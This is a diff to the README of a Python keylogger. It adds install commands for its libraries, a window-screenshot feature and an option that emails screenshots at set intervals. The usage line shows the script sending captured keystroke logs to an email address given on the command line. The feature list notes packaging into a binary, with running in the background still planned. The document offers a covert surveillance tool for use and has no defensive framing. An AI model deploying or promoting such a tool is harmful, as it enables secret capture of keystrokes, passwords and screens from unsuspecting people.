@@ -10,17 +10,26 @@ keylogger got*
 
 ## What i will Need to you this Script ?
 do you gonna need pyxhood and python-xlib
+the last one rest is pyscreenshot
+
+## How i install this libs ?
+**sample just copy and past in your terminal**
+```
+pip install pyscreenshot pyxhook & sudo apt install python-xlib
+```
 
 ## How i use it ?
 >python keylogger.py --email "" --password ""
 
 ## Syntax 
 ```
---password is your password of your email
+ --password is your password of your email
   
-  --email is logic your email to send the logs 
+ --email is logic your email to send the logs 
   
-  --local is the local where the program gonna save the logs and did will use to send the logs to your email
+ --local is the local where the program gonna save the logs and did will use to send the logs to your email
+
+ --time is the time the Screenshots is will be sended to your email
 ```
 
 # Meta
@@ -28,6 +37,7 @@ do you gonna need pyxhood and python-xlib
 distributed under license GNU GENERAL PUBLIC LICENSE version 3 by [Free Software Foundation, Inc.](fsf.org) Read the original GPL v3.
 
 ## Feature
+ - [x] take screenshot of window 
  - [x] Arguments and make a binare of the program 
  - [ ] Make the program run in the background
  - [x] Add the Pyinstaller 
